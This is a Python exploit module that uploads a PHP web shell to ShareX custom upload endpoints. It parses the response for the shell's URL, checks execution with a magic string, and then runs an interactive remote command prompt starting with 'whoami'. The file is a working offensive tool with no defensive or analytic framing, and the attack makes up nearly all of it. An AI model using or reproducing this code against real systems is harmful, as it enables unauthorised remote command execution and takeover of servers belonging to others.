import re
import io

from core.shell import Shell
from core.logger import Logger
from core.sharex import ShareX


class Exploit:

    class Error(Exception):
        def __init__(self, message, code=-1):
            self.message = message
            self.code = code

    MAGIC = '5H311.php'

    @staticmethod
    def get_shell_url(body):
        re_shell_urls = re.findall(r'https?:\/\/?[\w/\-?=%.]+\.[\w/\-&?=%.]+', body)

        if len(re_shell_urls) == 0:
            raise Exploit.Error(message='file path not displayed in response body')

        return re_shell_urls[-1]

    @staticmethod
    def check(shell_url):
        output = Shell.execute(shell_url, f'echo {Exploit.MAGIC}')
        return Exploit.MAGIC in output

    @staticmethod
    def upload_shell(url, form_name, secret, field_name, verbose):
        res = ShareX.upload(url, io.BytesIO(Shell.CODE.encode()), file_name=Exploit.MAGIC, form_name=form_name, secret=secret, field_name=field_name)

        res_code = res.status_code
        res_body = res.text.strip()

        # success
        if res_code == 200:
            for error in ShareX.Errors:
                if error.value['content'].lower() in res_body.lower():
                    reason = error.value['reason'].lower()
                    Logger.error(f'failed to upload shell: \x1b[95m{reason}')
  
            # get shell URL from response
            shell_url = Exploit.get_shell_url(res_body)

            # vulnerable check
            if not Exploit.check(shell_url):
                Logger.error('target does not appear vulnerable')

            Logger.success('php web shell uploaded')

            if verbose:
                Logger.info(f'location: \x1b[95m{shell_url}')

            print() # prints newline, duh

            user = Shell.execute(shell_url, 'whoami')

            # start shell
            while True:
                try:
                    cmd = input(f'{user.strip()} $ ')
                except KeyboardInterrupt:
                    return
                except EOFError:
                    return

                try:
                    output = Shell.execute(shell_url, cmd)

                    if output is not None and len(output) > 0:
                        print(output)

                except Exception:
                    Logger.error('failed to execute command')

        # blocked
        elif res_code == 403:
            Logger.error('target blocked file upload. waf?')

        # not found
        elif res_code == 404:
            Logger.error('file upload endpoint not found')

        # unknown
        else:
            Logger.error('unknown response code')
